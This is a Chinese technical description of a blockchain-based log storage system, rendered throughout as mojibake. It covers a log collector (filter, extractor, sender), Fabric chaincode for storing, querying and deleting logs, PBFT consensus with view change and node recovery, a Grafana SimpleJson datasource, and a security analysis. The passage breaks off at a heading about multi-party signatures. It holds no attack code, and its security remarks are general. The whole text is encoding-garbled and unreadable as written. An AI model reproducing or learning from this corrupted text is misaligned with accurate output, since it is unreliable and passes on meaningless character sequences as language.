è¿‡æ»¤å™¨ï¼šè¿‡æ»¤å™¨å…è®¸æ‚¨åŠ¨æ€åˆ›å»ºæ–°çš„é”®/å€¼è¿‡æ»¤å™¨ï¼Œè¿™äº›è¿‡æ»¤å™¨å°†è‡ªåŠ¨åº”ç”¨äºä½¿ç”¨è¯¥æ•°æ®æºçš„æ‰€æœ‰æŸ¥è¯¢ã€‚ åŠŸèƒ½å¼ºå¤§çš„grafanaå¯ä»¥å¸®åŠ©æˆ‘ä»¬æ–¹ä¾¿åœ°è¿›è¡Œæ—¥å¿—åˆ†æã€‚ è¯¦ç»†å®ç°æ—¥å¿—æ”¶é›†æ¨¡å—Filteråœ¨æ—¥å¿—æ”¶é›†ä»»åŠ¡éƒ¨ç½²æ—¶å¯æŒ‡å®šæ¯è¡Œæ—¥å¿—å¿…é¡»åŒ…å«çš„å­—ç¬¦ä¸²æ•°ç»„incl[]ä¸ä¸å¯åŒ…å«çš„å­—ç¬¦ä¸²æ•°ç»„exec[]ã€‚å¯¹æ¯è¡Œæ—¥å¿—è¿›è¡Œåˆ¤æ–­æ˜¯å¦æ»¡è¶³åŒ…å«æ‰€æœ‰incl[]å†…çš„å­—ç¬¦ä¸²ï¼ŒåŠä¸åŒ…å«exec[]å†…çš„å­—ç¬¦ä¸²ã€‚è‹¥ä¸æ»¡è¶³è¦æ±‚ï¼Œåˆ™æŠŠè¯¥è¡Œæ—¥å¿—ä¸¢å¼ƒã€‚ extractoråœ¨æ—¥å¿—æ”¶é›†ä»»åŠ¡éƒ¨ç½²æ—¶æŒ‡å®šæ—¥å¿—åˆ†éš”ç¬¦ç”¨äºå°†è¯¥è¡Œæ—¥å¿—åˆ†æˆè‹¥å¹²æ®µï¼Œå¹¶æ ¹æ®æŒ‡å®šçš„å¯¹åº”å…³é”®å­—æ®µåç§°åŠå­—æ®µä½ç½®ï¼Œæå–å‡ºå…³é”®å­—æ®µï¼ŒåŒæ—¶å°†å…¶ä½™æ—¥å¿—å­—æ®µä¸¢å¼ƒã€‚ä¹Ÿå¯é€šè¿‡ä¸æŒ‡å®šåˆ†éš”ç¬¦å’Œå…³é”®å­—æ®µåç§°ï¼Œä½ç½®æ¥ä¸è¿›è¡Œå…³é”®å­—æ®µæå–ï¼Œè¿™æ—¶è¿”å›æ•´è¡Œæ—¥å¿—ã€‚ä¸ºäº†ä½¿æ—¥å¿—åœ¨åŒºå—é“¾ä¸­æŒ‰æ—¶é—´é¡ºåºå‚¨å­˜ï¼Œåœ¨extractè¿‡ç¨‹ä¸­åˆ¤æ–­æœ‰æ— timestampå­—æ®µï¼Œè‹¥æ— ï¼Œåˆ™æŠŠå½“å‰æ—¶é—´æ·»åŠ åˆ°timestamå­—æ®µã€‚ senderåœ¨æ—¥å¿—æ”¶é›†ä»»åŠ¡éƒ¨ç½²æ—¶æŒ‡å®šç›®æ ‡åŒºå—é“¾å„èŠ‚ç‚¹çš„urlï¼Œå¹¶ä»¥å½“å‰æ—¥å¿—ä»»åŠ¡åä½œä¸ºæ—¥å¿—åŒ…ç´¢å¼•ï¼Œå°†å·²ç»è¿‡æ»¤å’Œæå–å…³é”®å­—æ®µçš„æ—¥å¿—åˆ©ç”¨fabric v0.6çš„restful apiè¿›è¡Œæ—¥å¿—å‘é€ã€‚åœ¨å‘é€æ—¶ï¼Œæ ¹æ®ä»»åŠ¡é…ç½®ä¸­çš„åŒºå—é“¾èŠ‚ç‚¹ï¼Œæ¯æ¬¡éšæœºé€‰å–å…¶ä¸­ä¸€ä¸ªèŠ‚ç‚¹ä½œä¸ºpbftå…±è¯†çš„ä¸»èŠ‚ç‚¹ï¼Œè¿›è¡Œæ—¥å¿—å‘é€ï¼Œä»è€Œæ¯ä¸ªåŒºå—é“¾èŠ‚ç‚¹éƒ½ä½œä¸ºä¸»èŠ‚ç‚¹è¿›è¡Œå…±è¯†ï¼Œæé«˜å…±è¯†å¹¶è¡Œæ€§ã€‚ åŒºå—é“¾å­˜å‚¨æ¨¡å—æ¥æ”¶å¹¶å­˜å‚¨æ—¥å¿—å½“åŒºå—é“¾èŠ‚ç‚¹æ¥æ”¶åˆ°æ—¥å¿—æ”¶é›†æ¨¡å—å‘é€çš„chaincode invokeè¯·æ±‚æ—¶ï¼Œchaincodeé€šè¿‡ä¸€ä¸ªäº‹åŠ¡è¯·æ±‚æ¥æ‰§è¡Œå¯¹è´¦æœ¬çš„å½“å‰çŠ¶æ€æ•°æ®åº“æ“ä½œã€‚chaincodeæ‰§è¡Œä¼šç”Ÿæˆä¸€ç»„è¯»å†™é›†ï¼Œå°†æ¥æ”¶åˆ°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³æ—¥å¿—æ–‡ä»¶è·¯å¾„ä½œä¸ºIDï¼Œè¿™ç»„è¯»å†™é›†å°†è¢«æäº¤åˆ°çŠ¶æ€æ•°æ®åº“å‚¨å­˜ï¼Œå¹¶è½¬å‘ç»™å…¶ä»–å…±è¯†èŠ‚ç‚¹è¿›è¡Œpbftå…±è¯†ã€‚ ä¸‹å›¾ä¸ºpbftæ‰§è¡Œè¿‡ç¨‹ï¼š å‡è®¾ç³»ç»Ÿè¦æ±‚æ¯æ¬¡äº§ç”ŸåŒºå—çš„æ—¶é—´é—´éš”ä¸ºğ‘¡ï¼Œåˆ™åœ¨ä¸€åˆ‡æ­£å¸¸çš„æƒ…å†µä¸‹ï¼Œç®—æ³•æŒ‰ç…§ä»¥ä¸‹æµç¨‹æ‰§è¡Œï¼š ä»»æ„èŠ‚ç‚¹å‘å…¨ç½‘å¹¿æ’­æ—¥å¿—æ•°æ®ï¼Œå¹¶é™„ä¸Šå‘é€è€…çš„ç­¾å æ‰€æœ‰å¤‡ä»½èŠ‚ç‚¹å‡ç‹¬ç«‹ç›‘å¬å…¨ç½‘çš„æ—¥å¿—æ•°æ®ï¼Œå¹¶è®°å½•åœ¨å†…å­˜ ä¸»èŠ‚ç‚¹åœ¨ç»è¿‡æ—¶é—´ğ‘¡å,å‘é€âŒ©ğ‘ƒğ‘’ğ‘Ÿğ‘ğ‘ğ‘Ÿğ‘’ğ‘…ğ‘’ğ‘ğ‘¢ğ‘’ğ‘ ğ‘¡,â„,ğ‘£,ğ‘,ğ‘ğ‘™ğ‘œğ‘ğ‘˜,âŒ©ğ‘ğ‘™ğ‘œğ‘ğ‘˜âŒªğœğ‘âŒª å¤‡ä»½èŠ‚ç‚¹ğ‘–åœ¨æ”¶åˆ°ææ¡ˆåï¼Œå‘é€âŒ©ğ‘ƒğ‘’ğ‘Ÿğ‘ğ‘ğ‘Ÿğ‘’ğ‘…ğ‘’ğ‘ ğ‘ğ‘œğ‘›ğ‘ ğ‘’,â„,ğ‘£,ğ‘–,âŒ©ğ‘ğ‘™ğ‘œğ‘ğ‘˜âŒªğœğ‘–âŒª ä»»æ„èŠ‚ç‚¹åœ¨æ”¶åˆ°è‡³å°‘ğ‘›âˆ’ğ‘“ä¸ªâŒ©ğ‘ğ‘™ğ‘œğ‘ğ‘˜âŒªğœğ‘–åï¼Œå…±è¯†è¾¾æˆå¹¶å‘å¸ƒå®Œæ•´çš„åŒºå— ä»»æ„èŠ‚ç‚¹åœ¨æ”¶åˆ°å®Œæ•´åŒºå—åï¼Œå°†åŒ…å«çš„æ—¥å¿—ä»å†…å­˜ä¸­åˆ é™¤ï¼Œå¹¶å¼€å§‹ä¸‹ä¸€è½®å…±è¯† è¯¥ç®—æ³•è¦æ±‚å‚ä¸å…±è¯†çš„èŠ‚ç‚¹ä¸­ï¼Œè‡³å°‘æœ‰ğ‘›âˆ’ğ‘“ä¸ªèŠ‚ç‚¹å…·æœ‰ç›¸åŒçš„åˆå§‹çŠ¶æ€ï¼šå³å¯¹äºæ‰€æœ‰çš„èŠ‚ç‚¹ğ‘–ï¼Œå…·æœ‰ç›¸åŒçš„åŒºå—é«˜åº¦â„å’Œè§†å›¾ç¼–å·ğ‘£ã€‚è€Œè¿™ä¸ªè¦æ±‚å¾ˆå®¹æ˜“è¾¾æˆï¼šé€šè¿‡åŒºå—åŒæ­¥æ¥è¾¾åˆ°â„çš„ä¸€è‡´æ€§ï¼Œé€šè¿‡è§†å›¾æ›´æ¢æ¥è¾¾åˆ°ğ‘£çš„ä¸€è‡´æ€§ã€‚èŠ‚ç‚¹åœ¨ç›‘å¬å…¨ç½‘äº¤æ˜“ä»¥åŠåœ¨æ”¶åˆ°ææ¡ˆåï¼Œéœ€è¦å¯¹äº¤æ˜“è¿›è¡Œåˆæ³•æ€§éªŒè¯ã€‚å¦‚æœå‘ç°éæ³•äº¤æ˜“ï¼Œåˆ™ä¸èƒ½å°†å…¶å†™å…¥å†…å­˜æ± ï¼›å¦‚æœéæ³•äº¤æ˜“åŒ…å«åœ¨ææ¡ˆä¸­ï¼Œåˆ™æ”¾å¼ƒæœ¬æ¬¡å…±è¯†å¹¶ç«‹å³å¼€å§‹è§†å›¾æ›´æ¢ã€‚ äº¤æ˜“çš„éªŒè¯æµç¨‹å¦‚ä¸‹ï¼š äº¤æ˜“çš„æ•°æ®æ ¼å¼æ˜¯å¦ç¬¦åˆç³»ç»Ÿè§„åˆ™ï¼Œå¦‚æœä¸ç¬¦åˆåˆ™åˆ¤å®šä¸ºéæ³•ï¼› äº¤æ˜“åœ¨åŒºå—é“¾ä¸­æ˜¯å¦å·²ç»å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨åˆ™åˆ¤å®šä¸ºéæ³•ï¼› äº¤æ˜“çš„æ‰€æœ‰åˆçº¦è„šæœ¬æ˜¯å¦éƒ½æ­£ç¡®æ‰§è¡Œï¼Œå¦‚æœæ²¡æœ‰åˆ™åˆ¤å®šä¸ºéæ³•ï¼› äº¤æ˜“ä¸­æœ‰æ²¡æœ‰å¤šé‡æ”¯ä»˜è¡Œä¸ºï¼Œå¦‚æœæœ‰åˆ™åˆ¤å®šä¸ºéæ³•ï¼› å¦‚æœä»¥ä¸Šåˆ¤å®šéƒ½ä¸ç¬¦åˆï¼Œåˆ™ä¸ºåˆæ³•äº¤æ˜“ï¼› å½“èŠ‚ç‚¹ğ‘–åœ¨ç»è¿‡2ğ‘£+1.ğ‘¡çš„æ—¶é—´é—´éš”åä»æœªè¾¾æˆå…±è¯†ï¼Œæˆ–æ¥æ”¶åˆ°åŒ…å«éæ³•äº¤æ˜“çš„ææ¡ˆåï¼Œå¼€å§‹è¿›å…¥è§†å›¾æ›´æ¢æµç¨‹ï¼š ä»¤ğ‘˜ = 1ï¼Œğ‘£ğ‘˜ = ğ‘£ + ğ‘˜ï¼› èŠ‚ç‚¹ğ‘–å‘å‡ºè§†å›¾æ›´æ¢è¯·æ±‚âŒ©ğ¶â„ğ‘ğ‘›ğ‘”ğ‘’ğ‘‰ğ‘–ğ‘’ğ‘¤,â„,ğ‘£,ğ‘–,ğ‘£ğ‘˜âŒªï¼› ä»»æ„èŠ‚ç‚¹æ”¶åˆ°è‡³å°‘ğ‘› âˆ’ ğ‘“ä¸ªæ¥è‡ªä¸åŒğ‘–çš„ç›¸åŒğ‘£ğ‘˜åï¼Œè§†å›¾æ›´æ¢è¾¾æˆï¼Œä»¤ğ‘£ = ğ‘£ğ‘˜å¹¶å¼€å§‹å…±è¯†ï¼› å¦‚æœåœ¨ç»è¿‡2ğ‘£ğ‘˜+1.ğ‘¡çš„æ—¶é—´é—´éš”åï¼Œè§†å›¾æ›´æ¢ä»æœªè¾¾æˆï¼Œåˆ™ğ‘˜é€’å¢å¹¶å›åˆ°ç¬¬2æ­¥ï¼› éšç€ğ‘˜çš„å¢åŠ ï¼Œè¶…æ—¶çš„ç­‰å¾…æ—¶é—´ä¹Ÿä¼šå‘ˆæŒ‡æ•°çº§å¢åŠ ï¼Œå¯ä»¥é¿å…é¢‘ç¹çš„è§†å›¾æ›´æ¢æ“ä½œï¼Œå¹¶ä½¿å„èŠ‚ç‚¹å°½å¿«å¯¹ğ‘£è¾¾æˆä¸€è‡´ã€‚ è€Œåœ¨è§†å›¾æ›´æ¢è¾¾æˆä¹‹å‰ï¼ŒåŸæ¥çš„è§†å›¾ğ‘£ä¾ç„¶æœ‰æ•ˆï¼Œç”±æ­¤é¿å…äº†å› å¶ç„¶æ€§çš„ç½‘ç»œå»¶è¿Ÿè¶…æ—¶è€Œå¯¼è‡´ä¸å¿…è¦çš„è§†å›¾æ›´æ¢ã€‚ æœ€ç»ˆæ—¥å¿—åœ¨é“¾ä¸Šå‚¨å­˜å¦‚ä¸‹ï¼š èŠ‚ç‚¹ä¸»åŠ¨æ¢å¤çš„åŠŸèƒ½åŒºå—é“¾ç½‘ç»œåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå¯èƒ½å‡ºç°ç½‘ç»œæŠ–åŠ¨ã€ç£ç›˜æ•…éšœç­‰åŸå› ï¼Œå¯èƒ½ä¼šå¯¼è‡´éƒ¨åˆ†èŠ‚ç‚¹çš„æ‰§è¡Œé€Ÿåº¦è½åå¤§å¤šæ•°èŠ‚ç‚¹ï¼Œå› æ­¤éœ€è¦æ·»åŠ ä¸»åŠ¨æ¢å¤çš„åŠŸèƒ½æ‰èƒ½å‚ä¸åç»­çš„å…±è¯†æµç¨‹ï¼Œä¸ºäº†è§£å†³è¿™ç±»é—®é¢˜ï¼Œå°±éœ€è¦é€šè¿‡ä¸»åŠ¨ç´¢å–å…±è¯†ç½‘ç»œä¸­æ‰€æœ‰èŠ‚ç‚¹çš„è§†å›¾ï¼Œæœ€æ–°çš„åŒºå—é«˜åº¦ç­‰ä¿¡æ¯æ‰èƒ½æ›´æ–°è‡ªèº«çš„æ•°æ®çŠ¶æ€ï¼Œæœ€ç»ˆä¸ç³»ç»Ÿçš„æ•°æ®ä¿æŒä¸€è‡´ã€‚ åœ¨èŠ‚ç‚¹å¯åŠ¨ã€èŠ‚ç‚¹çŠ¶æ€å¼‚å¸¸æˆ–è€…å¤šæ¬¡å‘èµ· viewchange å´ä¸è¢«å…¶ä»–èŠ‚ç‚¹æ¥å—çš„æ—¶å€™ï¼ŒèŠ‚ç‚¹å°±åº”è¯¥å‘èµ·ä¸»åŠ¨æ¢å¤æ•°æ®çš„è¯·æ±‚ï¼ŒåŒæ­¥åŒºå—é«˜åº¦ã€å…±è¯†ç½‘ç»œè§†å›¾ç­‰ä¿¡æ¯ã€‚ ä¸»åŠ¨æ¢å¤çš„æµç¨‹ä¸»è¦åˆ†ä¸º 2 æ­¥ï¼š NegotiateView åŒæ­¥å½“å‰çš„è§†å›¾ä¿¡æ¯å’Œè·¯ç”±ä¿¡æ¯ï¼› åŒæ­¥å…¨ç½‘æœ€æ–°åŒºå—ä¿¡æ¯ã€‚ ä»¥ä¸‹ä¸ºå…·ä½“æµç¨‹ï¼š å¾…æ¢å¤èŠ‚ç‚¹é¦–å…ˆå¹¿æ’­ QueryView æ¶ˆæ¯ï¼Œè·å–ç½‘ç»œä¸­æ‰€æœ‰èŠ‚ç‚¹çš„å½“å‰è§†å›¾ä¿¡æ¯å’Œè·¯ç”±ä¿¡æ¯ å…¶ä½™æ­£å¸¸èŠ‚ç‚¹æ”¶åˆ° QueryView æ¶ˆæ¯åï¼Œè¿”å›å½“å‰èŠ‚ç‚¹çš„å½“å‰è§†å›¾ä¿¡æ¯ viewï¼Œå½“å‰èŠ‚ç‚¹åç§° ReplicaId å’Œè·¯ç”±ä¿¡æ¯ Nï¼ˆèŠ‚ç‚¹æ€»æ•°ï¼‰ å¾…æ¢å¤èŠ‚ç‚¹å¦‚æœæ”¶åˆ° quorum ä¸ªï¼ˆ2f+1ï¼‰åŒ…å«ç›¸åŒçš„ N å’Œ view çš„QueryViewResonse æ¶ˆæ¯ï¼Œæˆ–è€…æ”¶åˆ° 2f ä¸ªåŒ…å«ç›¸åŒ N å’Œ view çš„æŠ¥æ–‡ä¸”æŠ¥æ–‡çš„ view ä¸ç­‰äºå½“å‰å¾…æ¢å¤èŠ‚ç‚¹çš„ viewï¼Œåˆ™å°†æœ¬èŠ‚ç‚¹çš„è§†å›¾ view åŒæ­¥æˆå…¨æˆç½‘ç»œçš„ view å’Œ N å¾…æ¢å¤èŠ‚ç‚¹å¹¿æ’­ RevoeryToCheckpoint æ¶ˆæ¯åˆ°ç½‘ç»œæ‰€æœ‰èŠ‚ç‚¹ï¼Œè¯·æ±‚å…¶ä½™èŠ‚ç‚¹çš„æ£€æŸ¥ç‚¹ checkpoint ä¿¡æ¯å’Œ psetã€qset å’Œ cset çš„ä¿¡æ¯ï¼ˆå³ PBFT ç®—æ³•ä¸­ pre-prepareé˜¶æ®µã€prepare é˜¶æ®µå’Œ commit é˜¶æ®µçš„æ•°æ®ï¼‰ æ­£å¸¸èŠ‚ç‚¹æ”¶åˆ° RevoeryToCheckpoint æ¶ˆæ¯å’Œ RecoveryToPQC ä¿¡æ¯åï¼Œå°†è‡ªèº«çš„æ£€æŸ¥ç‚¹ä¿¡æ¯å’Œ PQC ä¿¡æ¯è¿”å›ç»™å¾…æ¢å¤èŠ‚ç‚¹ å¾…æ¢å¤èŠ‚ç‚¹æ”¶åˆ° quorum ä¸ª RevoeryToCheckpointResponse æ¶ˆæ¯åï¼Œæ‰¾åˆ°å¾…æ¢å¤çš„ç¨³å®šçš„ chekpoin ç‚¹ï¼Œè°ƒç”¨ stateUpdate æ›´æ–°è‡³ chekpoin ç‚¹çŠ¶æ€ï¼Œæ›´æ–°å®Œæ¯•åå¦‚æœå‘ç°è‡ªèº«çš„ checkpoint ä»ç„¶è½åï¼Œåˆ™å‘é€ RecoveryToPQC æ¶ˆæ¯ï¼Œè·å– PQC æ¶ˆæ¯æ›´æ–°è‡ªèº«çš„ psetã€qset å’Œ cset é›†åˆã€‚ å½“åèŠ‚ç‚¹ä¸»åŠ¨æ¢å¤æ—¶æµç¨‹å¦‚ä¸‹å›¾ï¼š æŸ¥è¯¢æ—¥å¿—é€šè¿‡å†™ query chaincode,åœ¨å…¶ä¸­è°ƒç”¨ ChaincodeStubInterface æ¥å£çš„ GetHistoryForKey()æ–¹æ³•æ¥æŸ¥è¯¢æŒ‡å®š ID çš„å†å²æ—¥å¿—ã€‚å¤–ç•Œå¯åˆ©ç”¨ fabric çš„ http api è°ƒç”¨ query chaincodeã€‚ chaincodeæ™ºèƒ½åˆçº¦initInitæ–¹æ³•ä¼šåœ¨chaincodeæ¥æ”¶åˆ°instantiateï¼ˆå®ä¾‹åŒ–ï¼‰æˆ–è€…upgrade(å‡çº§)äº¤æ˜“æ—¶è¢«è°ƒç”¨ï¼Œè¿›è€Œä½¿å¾—chaincodeé¡ºåˆ©æ‰§è¡Œå¿…è¦çš„åˆå§‹åŒ–æ“ä½œã€‚åœ¨initå‚æ•°ä¸­éœ€ç»™å‡ºå½“å‰æ—¥å¿—ä»»åŠ¡åå’Œå…¶å…³é”®å­—åï¼Œåˆ›å»ºä¸€ä¸ªç©º []map[string]interface&#123;&#125;ï¼Œç”¨äºä»¥åå­˜å‚¨æ—¥å¿—ã€‚åŒæ—¶å°†å…³é”®å­—åå­˜å‚¨åœ¨[]stringä¸­ï¼Œç”¨äºgrafanaæŸ¥è¯¢ã€‚å¹¶åˆå§‹åŒ–æ—¥å¿—æ¡æ•°ä¸º0ã€‚ invokeæ—¥å¿—æ”¶é›†æ¨¡å—è§¦å‘invokeæ¥è¿›è¡Œæ—¥å¿—å­˜å‚¨ã€‚å°†senderå‘è¿‡æ¥çš„æ—¥å¿—åˆ‡ç‰‡è¿›è¡ŒUnmarshalååºåˆ—åŒ–åï¼Œappendåˆ°å·²æœ‰çš„æ—¥å¿—åˆ‡ç‰‡ä¸­ï¼Œå¹¶æŒ‰æ—¶é—´æˆ³è¿›è¡Œæ’åºï¼Œä¿è¯æŒ‰æ—¶é—´é¡ºåºå­˜å‚¨ã€‚ queryQuery chiancodeè®¾è®¡äº†search_keywordsï¼Œget_numï¼Œget_logsï¼Œget_delete_infoå››ç§æ–¹æ³•ä¾›grafanaæŸ¥è¯¢ã€‚search_keywordsç”¨äºæŸ¥è¯¢æœ‰å“ªäº›å…³é”®å­—ï¼Œè¿”å›[]stringï¼›get_numç”¨äºæŸ¥è¯¢è¯¥ä»»åŠ¡åœ¨åŒºå—é“¾ä¸­å­˜äº†å¤šå°‘æ¡æ—¥å¿—ï¼Œè¿”å›[]byte(int64); get_logsè¿”å›æ¯æ¡æ—¥å¿—çš„è¦æŸ¥è¯¢çš„å…³é”®å­—æ®µï¼Œè¿”å›map[string][]interface&#123;&#125;,å³map[å…³é”®å­—åç§°][content1,content2,...]ï¼›get_delete_infoæŸ¥è¯¢å†å²deleteæ“ä½œä¿¡æ¯ï¼ŒåŒ…æ‹¬åˆ é™¤æ“ä½œçš„æ—¶é—´ï¼Œæ‰€åˆ é™¤çš„æ—¥å¿—æ•°ã€‚ deleteç”¨äºå¯¹chaincodeä¸­æ‰€è®¾å®šçš„æ—¶é—´ä»¥å‰çš„æ—¥å¿—æ•°æ®è¿›è¡Œåˆ é™¤ã€‚è§¦å‘delete chaincodeï¼Œé¦–å…ˆå¯¹æ‰€æœ‰æ—¥å¿—æŒ‰æ—¶é—´é¡ºåºè¿›è¡Œéå†ï¼Œå¹¶åˆ é™¤æ‰€æœ‰è§„å®šæ—¶é—´å‰çš„æ•°æ®ï¼Œæœ€åè®°å½•æœ¬æ¬¡åˆ é™¤æ“ä½œçš„æ—¶é—´å’Œåˆ é™¤æ—¥å¿—æ•°ã€‚ å®šæœŸæ¸…ç†æ—¥å¿—ä¸ºé™ä½å­˜å‚¨æˆæœ¬ï¼Œæˆ‘ä»¬è€ƒè™‘å¯¹åŒºå—é“¾ä¸­å­˜å‚¨çš„æ—¥å¿—åŒºå—è¿›è¡Œå®šæœŸæˆªæ–­ã€‚å½“å‰è€ƒè™‘å¯¹åŒºå—é“¾ä¸­åŠå¹´å‰ï¼ˆæ—¶é—´å¯è‡ªå®šä¹‰ï¼Œä½†æ˜¯å›ºå®šåœ¨chiancodeä¸­çš„ï¼Œéƒ¨ç½²ä¹‹åä¸å¯ä¿®æ”¹ï¼‰çš„æ—¥å¿—åŒºå—è¿›è¡Œåˆ é™¤ã€‚æˆ‘ä»¬åœ¨init,invoke,query chaincodeçš„åŸºç¡€ä¸Šæ·»åŠ delete chaincodeï¼Œç”¨äºæ‰§è¡ŒåŒºå—åˆ é™¤æ“ä½œã€‚åœ¨peerèŠ‚ç‚¹å¯åŠ¨æ—¶å¼€å¯ä¸€ä¸ªçº¿ç¨‹å»æ¯å¤©è§¦å‘ä¸€æ¬¡deleteäº¤æ˜“ï¼Œè¿™æ ·è¯¥deleteäº¤æ˜“é€šè¿‡pbftå…±è¯†åˆ°è¾¾æ‰€æœ‰peerèŠ‚ç‚¹åï¼Œæ‰§è¡Œdelete chaincodeå»æ¸…ç†åŠå¹´å‰çš„æ—¥å¿—åŒºå—ã€‚ ä¸ºä¸ç ´ååŒºå—é“¾ç»“æ„ï¼Œæˆ‘ä»¬ä¿ç•™ä¸€ä¸ªåŠå¹´å‰çš„åŒºå—ï¼Œä½œä¸ºè¢«æˆªæ–­åçš„åŒºå—é“¾çš„åˆ›ä¸–åŒºå—ï¼Œä½¿å¾—æˆªæ–­åçš„åŒºå—é“¾èƒ½å¤Ÿé€šè¿‡hashæ ¡éªŒï¼Œä¿è¯å®‰å…¨æ€§ã€‚ å¯è§†åŒ–åˆ†ææ¨¡å—Grafanaä½œä¸ºæœ€ç«çƒ­çš„å¼€æºæ•°æ®å¯è§†åŒ–å·¥å…·ï¼Œæœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯æ”¯æŒå¤šç§æ•°æ®æºä»¥åŠä¸°å¯Œçš„æ’ä»¶åº“ã€‚SimpleJsonæ˜¯Grafanaå¼€æºç¤¾åŒºæä¾›çš„æ•°æ®æºï¼Œå®ƒæœ¬èº«å¹¶ä¸ä¾èµ–æŸç§ç‰¹å®šçš„åç«¯å­˜å‚¨ï¼Œåªéœ€è¦åç«¯èƒ½å®ç°GrafanaæŠ¥è¡¨çš„å‡ ä¸ªæŸ¥è¯¢æ¥å£å°±è¡Œã€‚SimpleJsonæ˜¯Grafanaä¼—å¤šæ•°æ®æºæ’ä»¶ä¸­çš„ä¸€ç§ï¼Œä½†å®ƒåˆä¸åƒå…¶ä»–æ’ä»¶é…ç½®å¥½æ•°æ®åº“ä¿¡æ¯å°±èƒ½ç”¨ï¼Œå¼€å‘è€…éœ€è¦è‡ªå·±å®ç°ä¸€éƒ¨åˆ†æ•°æ®æºæ’ä»¶çš„åŠŸèƒ½æ¥ä½¿SimpleJsonæ’ä»¶èƒ½å¤Ÿä½¿ç”¨ã€‚ æˆ‘ä»¬åŸºäºSimpleJsonç¼–å†™grafana datasourceæ’ä»¶ï¼Œä½¿grafana å¯ä»¥é€šè¿‡ fabricçš„ http api è°ƒç”¨ query chaincode è¯»å–å‚¨å­˜åœ¨åŒºå—é“¾ä¸­çš„æ—¥å¿—æ•°æ®ã€‚ ç³»ç»Ÿåˆ†ææœ¬é¡¹ç›®é€šè¿‡ä»¥åŒºå—é“¾å­˜å‚¨æŠ€æœ¯ä¸ºæ”¯æ’‘ï¼Œè®¾è®¡å¹¶å®ç°äº†ä¸€å¥—ä¸ºä¼ä¸šå’Œä¸ªäººç”¨æˆ·å­˜å‚¨æ—¥å¿—çš„å®‰å…¨ç³»ç»Ÿã€‚ç›¸æ¯”äºå¸‚é¢ä¸Šå·²æœ‰çš„äº§å“ï¼Œå…·æœ‰è¾ƒé«˜çš„å®‰å…¨æ€§ï¼Œèƒ½æœ‰æ•ˆé˜²æ­¢æ—¥å¿—é­åˆ°ç¯¡æ”¹æˆ–åˆ é™¤ã€‚åŒæ—¶æä¾›äº†æŸ¥è¯¢ä¸å¯è§†åŒ–åŠŸèƒ½ï¼Œæ–¹ä¾¿ç”¨æˆ·é’ˆå¯¹æ—¥å¿—è¿›è¡Œåˆ†æï¼Œèƒ½åŠæ—¶æœ‰æ•ˆäº†è§£æœåŠ¡å™¨è¿è¡ŒçŠ¶å†µã€‚ æœ¬é¡¹ç›®çš„å®‰å…¨æ€§åˆ†æå¦‚ä¸‹ï¼š ä»¥åŒºå—é“¾ä¸ºä¾æ‰˜æé«˜æ•°æ®å®‰å…¨æ€§ æœ¬é¡¹ç›®å°†æ—¥å¿—å®æ—¶å‘é€è‡³åŒºå—é“¾å¹¶å­˜å‚¨ï¼Œé»‘å®¢è‹¥æƒ³åœ¨æœ¬åœ°èŠ‚ç‚¹ç¯¡æ”¹æŸä¸€æ—¥å¿—å†…å®¹ï¼Œé‚£ä¹ˆæ ¹æ®å­˜å‚¨çš„åŸç†ï¼Œé¦–å…ˆéœ€è¦ä¼ªé€ æ—¥å¿—æäº¤è€…çš„ç­¾åï¼Œå§‘ä¸”ä¸è®ºèƒ½å¦è·å¾—æ—¥å¿—æäº¤è€…çš„ç§é’¥ï¼Œåœ¨ç­¾åä¼ªé€ æˆåŠŸåï¼Œä»éœ€æŒç»­æ›´æ”¹æœ¬åŒºå—çš„hashå€¼ï¼Œè¿™å°±ä¼šç›´æ¥å¯¼è‡´åç»­åŒºå—æ— æ³•é€šè¿‡Hashå€¼è¿æ¥æœ¬åŒºå—ï¼Œä¹Ÿå°±éœ€è¦å¯¹åç»­åŒºå—çš„æ‰€æœ‰Hashå€¼è¿›è¡Œå†è®¡ç®—ï¼Œå†æ›´æ”¹ã€‚å³ä½¿è¿›è¡Œäº†å¦‚æ­¤å¤§é‡çš„è¿ç®—ä¸æ›´æ”¹ï¼Œä½†ä¹Ÿä»…ä»…å±€é™äºæœ¬åœ°èŠ‚ç‚¹çš„è´¦æœ¬ä¸­åŒºå—é“¾ç»“æ„ï¼Œä»éœ€ç»§ç»­æ›´æ”¹ç´¢å¼•æ•°æ®åº“å’ŒçŠ¶æ€æ•°æ®åº“ã€‚å‡è®¾è¿™äº›æ›´æ”¹åœ¨æœ¬åœ°éƒ½å¯ä»¥æ­£ç¡®å®æ–½ï¼Œä½†æ˜¯ï¼ŒåŒºå—é“¾æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼çš„ç½‘ç»œç³»ç»Ÿï¼Œå•ä¸€èŠ‚ç‚¹çš„æ›´æ”¹ï¼Œå¿…é¡»å¾—åˆ°å…¶ä»–è¶³å¤Ÿå¤šèŠ‚ç‚¹çš„è®¤å¯å¹¶åŒæ­¥æ•°æ®ï¼Œè¿™æ‰èƒ½ä½¿åç»­ä¸šåŠ¡æ­£ç¡®å®æ–½ã€‚ å¼•ç”¨pbftå…±è¯†æœºåˆ¶é™ä½å­˜å‚¨å‡ºé”™ç‡ Pbftå…±è¯†æœºåˆ¶å¯ä»¥åœ¨ä¿¡ä»»ç¨‹åº¦è¾ƒä½çš„åœºæ™¯ä¸‹é¿å…æ‹œå åº­é—®é¢˜ã€‚åœ¨3f+1ä¸ªå…±è¯†èŠ‚ç‚¹ä¸­èƒ½å¿å—fä¸ªèŠ‚ç‚¹å‡ºé”™ä¸”ä¾ç„¶èƒ½å®ç°æ­£ç¡®å…±è¯†ï¼Œå­˜å‚¨æ—¥å¿—ï¼Œæé«˜ç°å®ä½¿ç”¨ä¸­çš„å®¹é”™ç‡ï¼Œå¢å¼ºå®ç”¨æ€§ï¼›æ—¥å¿—æ”¶é›†æ¨¡å—éšæœºé€‰å–åŒºå—é“¾peerèŠ‚ç‚¹å½“ä½œå…±è¯†ä¸»èŠ‚ç‚¹ï¼Œä½¿å¾—å¤šäº¤æ˜“èƒ½å¤Ÿå¹¶è¡Œå…±è¯†ï¼Œæé«˜ç³»ç»Ÿå…±è¯†æ•ˆç‡ã€‚ å¤šæ–¹ç­¾åé˜²æ­¢æ—¥å¿—ã€è¯·æ±‚ä¼ªé€  